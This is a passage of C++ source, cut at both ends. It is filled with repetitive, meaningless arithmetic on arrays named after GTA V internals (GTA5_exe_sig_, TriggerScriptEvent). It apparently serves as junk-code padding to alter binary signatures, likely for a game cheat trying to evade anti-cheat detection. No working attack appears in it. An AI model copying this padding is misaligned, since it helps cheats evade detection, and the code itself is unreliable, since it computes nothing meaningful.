				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			ofstream Arquivo;
			Arquivo.open(arquivoTXT);
			Arquivo << "";
			Arquivo.close();
		}
	};
	namespace StringManager
	{
		int PED_TO_NET_ = 2;
		int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		int offset = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		float a = 0.0f;
		float b = 0.0f;
		int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

		int ponteiro = 2;
		int aaaaaa = ponteiro * 2;
		int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		bool SeContemTexto(std::string string, std::string textoProcurado)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
